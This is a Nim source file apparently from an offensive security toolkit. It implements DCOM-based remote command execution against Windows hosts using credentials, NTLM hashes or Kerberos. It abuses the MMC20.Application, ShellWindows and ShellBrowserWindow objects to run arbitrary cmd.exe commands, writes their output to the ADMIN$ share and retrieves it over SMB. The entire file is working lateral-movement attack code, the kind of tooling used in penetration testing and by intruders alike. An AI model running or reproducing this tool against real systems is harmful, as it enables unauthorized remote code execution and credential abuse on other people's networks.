import std/[asyncdispatch, strutils, random, times]

import ../smb/client as smb
import ../dcerpc/client as rpc
import ../dcom/client as dcom
import ./output as execio

type
  DcomExecResult* = object
    host*: string
    username*: string
    domain*: string
    success*: bool
    output*: string
    bytesRead*: int
    message*: string
    error*: string

const CLSID_MMC20 = [
  byte 0x1a, 0x79, 0xb2, 0x49, 0xae, 0xb1, 0x90, 0x4c,
       0x9b, 0x8e, 0xe8, 0x60, 0xba, 0x07, 0xf8, 0x89
]

const CLSID_ShellBrowserWindow = [
  byte 0x90, 0xfd, 0x8a, 0xc0, 0xa1, 0xf2, 0xd1, 0x11,
       0x84, 0x55, 0x00, 0xa0, 0xc9, 0x1f, 0x38, 0x80
]

const CLSID_ShellWindows = [
  byte 0x72, 0x59, 0xa0, 0x9b, 0xa8, 0xf6, 0xcf, 0x11,
       0xa4, 0x42, 0x00, 0xa0, 0xc9, 0x0a, 0x8f, 0x39
]

const IID_IDispatchBytes = [
  byte 0x00, 0x04, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
       0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46
]

proc bsLocal(b: openArray[byte]): string =
  result = newString(b.len)
  for i, x in b: result[i] = chr(int(x))

proc addU16Le(d: var string; v: uint16) =
  d.add char(int(v) and 0xff); d.add char((int(v) shr 8) and 0xff)
proc addU32Le(d: var string; v: uint32) =
  d.add char(int(v) and 0xff); d.add char((int(v) shr 8) and 0xff)
  d.add char((int(v) shr 16) and 0xff); d.add char((int(v) shr 24) and 0xff)
proc padTo4(d: var string) =
  while d.len mod 4 != 0: d.add char(0)
proc toUtf16Le(s: string): string =
  for c in s: result.add c; result.add char(0)

proc randomTempName(): string =
  var rng = initRand(int(getTime().toUnix()) xor cast[int](addr result))
  for _ in 0 ..< 10:
    let c = rng.rand(35)
    if c < 10: result.add chr(ord('0') + c)
    else: result.add chr(ord('a') + c - 10)

proc buildGetIDsOfNames(names: seq[string]): string =
  result.addU16Le 5
  result.addU16Le 7
  result.addU32Le 0
  result.addU32Le 0
  result.add "\x12\x34\x56\x78\x9a\xbc\xde\xf0"
  result.add "\xfe\xdc\xba\x98\x76\x54\x32\x10"
  result.addU32Le 0x00000001'u32
  result.addU32Le 0
  result.addU32Le 0
  result.addU32Le 0x00000002'u32
  result.addU32Le 0
  for _ in 0 ..< 16: result.add char(0)
  let n = uint32(names.len)
  result.addU32Le n
  for i in 0 ..< names.len:
    result.addU32Le 0x00020000'u32 + uint32(i * 4)
  for s in names:
    let utf = toUtf16Le(s) & "\x00\x00"
    let cnt = uint32(utf.len div 2)
    result.addU32Le cnt; result.addU32Le 0; result.addU32Le cnt
    result.add utf
    padTo4(result)
  result.addU32Le n
  result.addU32Le 0'u32

proc parseGetIDsOfNames(stub: string; count: int): seq[int32] =
  var i = 0
  dcom.parseOrpcThat(stub, i)
  if i + 4 > stub.len: return
  i += 4
  for _ in 0 ..< count:
    if i + 4 > stub.len: break
    result.add cast[int32](rpc.readU32Le(stub, i))
    i += 4

proc addOrpcThisWithExt(d: var string) =
  d.addU16Le 5
  d.addU16Le 7
  d.addU32Le 0
  d.addU32Le 0
  d.add "\x12\x34\x56\x78\x9a\xbc\xde\xf0"
  d.add "\xfe\xdc\xba\x98\x76\x54\x32\x10"
  d.addU32Le 0x00000001'u32
  d.addU32Le 0
  d.addU32Le 0
  d.addU32Le 0x00000002'u32
  d.addU32Le 0

proc padTo8(d: var string) =
  while d.len mod 8 != 0: d.add char(0)

proc addBstrDeferred(d: var string; s: string) =
  let cnt = uint32(s.len)
  d.addU32Le cnt
  d.addU32Le cnt * 2
  d.addU32Le cnt
  for c in s:
    d.add c
    d.add char(0)
  padTo4(d)

proc addVariantBstr(d: var string; s: string; refId: uint32) =
  d.addU32Le 5
  d.addU32Le 0
  d.addU16Le 8
  d.addU16Le 0
  d.addU16Le 0
  d.addU16Le 0
  d.addU32Le 8
  d.addU32Le refId
  d.addBstrDeferred(s)

proc addVariantI4(d: var string; val: int32) =
  d.addU32Le 5
  d.addU32Le 0
  d.addU16Le 3
  d.addU16Le 0
  d.addU16Le 0
  d.addU16Le 0
  d.addU32Le 3
  d.addU32Le cast[uint32](val)

proc buildInvokePropertyGet(dispId: int32): string =
  result.addOrpcThisWithExt()
  result.addU32Le cast[uint32](dispId)
  for _ in 0 ..< 16: result.add char(0)
  result.addU32Le 0
  result.addU32Le 2
  result.addU32Le 0
  result.addU32Le 0
  result.addU32Le 0
  result.addU32Le 0
  result.addU32Le 0
  result.addU32Le 0
  result.addU32Le 0

proc buildInvokeMethod4(dispId: int32; args: array[4, string]): string =
  result.addOrpcThisWithExt()
  result.addU32Le cast[uint32](dispId)
  for _ in 0 ..< 16: result.add char(0)
  result.addU32Le 0
  result.addU32Le 1
  result.addU32Le 0x00020000'u32
  result.addU32Le 0
  result.addU32Le 4
  result.addU32Le 0
  result.addU32Le 4
  var bstrRef = 0x00020010'u32
  for i in 0 ..< 4:
    result.addU32Le bstrRef + uint32(i * 4)
  padTo8(result)
  for i in 0 ..< 4:
    let s = args[3 - i]
    addVariantBstr(result, s, bstrRef + uint32((3-i) * 4) + 0x10000'u32)
    padTo8(result)
  result.addU32Le 0
  result.addU32Le 0
  result.addU32Le 0

proc buildInvokeMethodInt1(dispId: int32; val: int32): string =
  result.addOrpcThisWithExt()
  result.addU32Le cast[uint32](dispId)
  for _ in 0 ..< 16: result.add char(0)
  result.addU32Le 0
  result.addU32Le 1
  result.addU32Le 0x00020000'u32
  result.addU32Le 0
  result.addU32Le 1
  result.addU32Le 0
  result.addU32Le 1
  result.addU32Le 0x00020004'u32
  padTo8(result)
  addVariantI4(result, val)
  padTo8(result)
  result.addU32Le 0
  result.addU32Le 0
  result.addU32Le 0

proc buildInvokeShellExecute5(dispId: int32; args: array[4, string]): string =
  result.addOrpcThisWithExt()
  result.addU32Le cast[uint32](dispId)
  for _ in 0 ..< 16: result.add char(0)
  result.addU32Le 0
  result.addU32Le 1
  result.addU32Le 0x00020000'u32
  result.addU32Le 0
  result.addU32Le 5
  result.addU32Le 0
  result.addU32Le 5
  result.addU32Le 0x00020004'u32
  for i in 1 ..< 5:
    result.addU32Le 0x00020008'u32 + uint32((i-1) * 4)
  padTo8(result)
  addVariantI4(result, 0)
  padTo8(result)
  for i in 0 ..< 4:
    let s = args[3 - i]
    addVariantBstr(result, s, 0x00030000'u32 + uint32(i * 4))
    padTo8(result)
  result.addU32Le 0
  result.addU32Le 0
  result.addU32Le 0

proc parseInvokeDispatch(stub: string): string =
  let meowPos = stub.find("MEOW")
  if meowPos < 0: return ""
  var p = meowPos
  let objref = dcom.parseObjRef(stub, p)
  return objref.std.ipid

proc dcomExec*(host: string; port, timeoutMs: int;
               username, password, ntlmHash, domain, command: string;
               objectType = "MMC20";
               authMethod = smb.samNtlm): Future[DcomExecResult] {.async.} =
  result.host = host
  result.username = username
  result.domain = domain
  let cred = smb.SmbCredential(username: username, password: password,
    ntlmHash: ntlmHash, domain: domain)
  if authMethod == smb.samKerberos and cred.password.len == 0 and cred.ntlmHash.len == 0:
    result.error = "com requires NTLM credentials (-u/-p or -u/-H) alongside -k: the dynamic DCOM port only accepts NTLM"
    result.message = "dcomexec: " & result.error
    return
  let outName = randomTempName() & ".out"
  let outPath = "\\\\127.0.0.1\\ADMIN$\\Temp\\" & outName
  let commandLine = "/Q /c " & command & " 1> " & outPath & " 2>&1"

  let clsid = case objectType.toUpperAscii()
    of "SHELLBROWSERWINDOW": bsLocal(CLSID_ShellBrowserWindow)
    of "SHELLWINDOWS":       bsLocal(CLSID_ShellWindows)
    else:                    bsLocal(CLSID_MMC20)

  try:
    let scm =
      if authMethod == smb.samKerberos:
        await rpc.connectAndBindKerb(host, port, timeoutMs,
          @(dcom.IRemoteSCMActivatorUuidBytes), 0'u16, 0'u16, domain)
      else:
        await rpc.connectAndBind(host, port, timeoutMs,
          @(dcom.IRemoteSCMActivatorUuidBytes), 0'u16, 0'u16, cred)
    let createStub = dcom.buildRemoteCreateInstanceStub(
      clsid, bsLocal(IID_IDispatchBytes))
    let createResp = await scm.call(4'u16, createStub)
    scm.close()
    if not createResp.ok:
      result.error = "RemoteCreateInstance fault 0x" & createResp.faultStatus.toHex(8)
      result.message = "dcomexec: DCOM activation failed: " & result.error
      return
    let reply = dcom.parseActivationReply(createResp.stub)
    if reply.iwbemObjRef.std.ipid.len != 16:
      if reply.comError != 0:
        result.error = "RemoteCreateInstance returned HRESULT 0x" & reply.comError.toHex(8)
      else:
        result.error = "no interface pointer in activation reply"
      result.message = "dcomexec: " & result.error
      return

    var dynamicPort = 0
    for b in reply.bindings:
      if b.towerId != 7'u16: continue
      let lb = b.netAddr.find('[')
      let rb = b.netAddr.find(']', lb + 1)
      if lb < 0 or rb < 0: continue
      try: dynamicPort = parseInt(b.netAddr[lb + 1 ..< rb]); break
      except CatchableError: continue
    if dynamicPort == 0:
      for b in reply.iwbemObjRef.bindings:
        if b.towerId != 7'u16: continue
        let lb = b.netAddr.find('[')
        let rb = b.netAddr.find(']', lb + 1)
        if lb < 0 or rb < 0: continue
        try: dynamicPort = parseInt(b.netAddr[lb + 1 ..< rb]); break
        except CatchableError: continue
    if dynamicPort == 0 and reply.oxid.len == 8:
      let resolved = await dcom.resolveOxid2(host, port, timeoutMs, reply.oxid, cred)
      dynamicPort = dcom.tcpPortFromBindings(resolved.bindings)
    if dynamicPort == 0:
      result.error = "could not determine dynamic DCOM port"
      result.message = "dcomexec: " & result.error
      return

    let cli = await rpc.connectAndBind(host, dynamicPort, timeoutMs,
      @IID_IDispatchBytes, 0, 0, cred)

    let rootIpid = reply.iwbemObjRef.std.ipid
    let objUpper = objectType.toUpperAscii()

    template getDispId(cli2: auto; name: string; onIpid: string): int32 =
      let rg = await cli2.call(5'u16, buildGetIDsOfNames(@[name]), onIpid)
      if not rg.ok:
        cli2.close()
        result.error = "GetIDsOfNames(" & name & ") fault 0x" & rg.faultStatus.toHex(8)
        result.message = "dcomexec: " & result.error
        return result
      let ids = parseGetIDsOfNames(rg.stub, 1)
      if ids.len == 0:
        cli2.close()
        result.error = "no DISPID returned for " & name
        result.message = "dcomexec: " & result.error
        return result
      ids[0]

    template getPropIpid(cli2: auto; dispId2: int32; onIpid: string; label: string): string =
      let ri = await cli2.call(6'u16, buildInvokePropertyGet(dispId2), onIpid)
      if not ri.ok:
        cli2.close()
        result.error = "Invoke(" & label & ") fault 0x" & ri.faultStatus.toHex(8)
        result.message = "dcomexec: " & result.error
        return result
      let ip = parseInvokeDispatch(ri.stub)
      if ip.len != 16:
        cli2.close()
        result.error = "could not extract " & label & " interface pointer"
        result.message = "dcomexec: " & result.error
        return result
      ip

    var r: tuple[ok: bool; stub: string; faultStatus: uint32]

    if objUpper == "MMC20":
      let docId = getDispId(cli, "Document", rootIpid)
      let docIpid = getPropIpid(cli, docId, rootIpid, "Document")
      let viewId = getDispId(cli, "ActiveView", docIpid)
      let viewIpid = getPropIpid(cli, viewId, docIpid, "ActiveView")
      let execId = getDispId(cli, "ExecuteShellCommand", viewIpid)
      let execArgs = ["cmd.exe",
                      "C:\\Windows\\System32",
                      commandLine,
                      "7"]
      r = await cli.call(6'u16, buildInvokeMethod4(execId, execArgs), viewIpid)
      cli.close()
      if not r.ok:
        result.error = "ExecuteShellCommand fault 0x" & r.faultStatus.toHex(8)
        result.message = "dcomexec: " & result.error
        return

    elif objUpper == "SHELLWINDOWS":
      let itemId = getDispId(cli, "Item", rootIpid)
      r = await cli.call(6'u16, buildInvokeMethodInt1(itemId, 0'i32), rootIpid)
      if not r.ok:
        cli.close()
        result.error = "Invoke(Item) fault 0x" & r.faultStatus.toHex(8)
        result.message = "dcomexec: " & result.error
        return
      let browserIpid = parseInvokeDispatch(r.stub)
      if browserIpid.len != 16:
        cli.close()
        result.error = "could not extract Item interface pointer"
        result.message = "dcomexec: " & result.error
        return
      let docId = getDispId(cli, "Document", browserIpid)
      let docIpid = getPropIpid(cli, docId, browserIpid, "Document")
      let scriptId = getDispId(cli, "Script", docIpid)
      let scriptIpid = getPropIpid(cli, scriptId, docIpid, "Script")
      let execId = getDispId(cli, "ShellExecute", scriptIpid)
      let seArgs = ["cmd.exe",
                    commandLine,
                    "C:\\Windows\\System32",
                    ""]
      r = await cli.call(6'u16, buildInvokeShellExecute5(execId, seArgs), scriptIpid)
      cli.close()
      if not r.ok:
        result.error = "ShellExecute fault 0x" & r.faultStatus.toHex(8)
        result.message = "dcomexec: " & result.error
        return

    else:
      let docId = getDispId(cli, "Document", rootIpid)
      let docIpid = getPropIpid(cli, docId, rootIpid, "Document")
      let scriptId = getDispId(cli, "Script", docIpid)
      let scriptIpid = getPropIpid(cli, scriptId, docIpid, "Script")
      let execId = getDispId(cli, "ShellExecute", scriptIpid)
      let seArgs = ["cmd.exe",
                    commandLine,
                    "C:\\Windows\\System32",
                    ""]
      r = await cli.call(6'u16, buildInvokeShellExecute5(execId, seArgs), scriptIpid)
      cli.close()
      if not r.ok:
        result.error = "ShellExecute fault 0x" & r.faultStatus.toHex(8)
        result.message = "dcomexec: " & result.error
        return

    let session = await smb.establishSmbSession(host, 445, timeoutMs, cred, authMethod)
    if session == nil or not session.authenticated or session.adminTreeId == 0:
      result.success = true
      result.message = "command dispatched; SMB session unavailable for output retrieval"
      return
    let smbOutPath = "Temp\\" & outName
    let polled = await execio.pollOutputFile(session.ctx, session.adminTreeId,
      smbOutPath, attempts = 20, initialDelayMs = 300, backoffMs = 200,
      preDelayMs = 800)
    result.output = polled.data
    result.bytesRead = polled.data.len
    result.success = true
    result.message = if result.output.len > 0: "command executed via DCOM/" & objectType
                     else: "command dispatched; output file not found or empty"

  except CatchableError as e:
    result.error = e.msg.splitLines()[0]
    result.message = "dcomexec error: " & result.error
